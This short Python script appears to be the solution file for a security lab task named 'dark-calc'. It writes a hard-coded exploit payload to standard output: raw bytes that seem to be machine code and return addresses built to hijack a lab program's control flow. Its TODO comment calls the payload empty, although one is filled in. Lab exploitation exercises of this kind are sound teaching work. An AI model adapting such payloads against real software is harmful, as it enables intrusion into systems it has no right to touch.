#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b'\x68\x1f\x1c\x40\x00\x6a\x04\x5f\x68\x87\x1a\x40\x00\xc3\x00\x00\xc0\xe0\xff\xff\xff\x7f\x00\x00\xd0\x0f\x80\x00\x10\x72\x00'

sys.stdout.buffer.write(payload)
